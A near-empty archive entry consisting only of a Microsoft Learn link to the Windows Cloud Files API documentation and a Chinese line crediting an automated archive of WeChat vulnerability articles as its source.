https://learn.microsoft.com/zh-cn/windows/win32/cfApi/cloud-files-api-portal  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
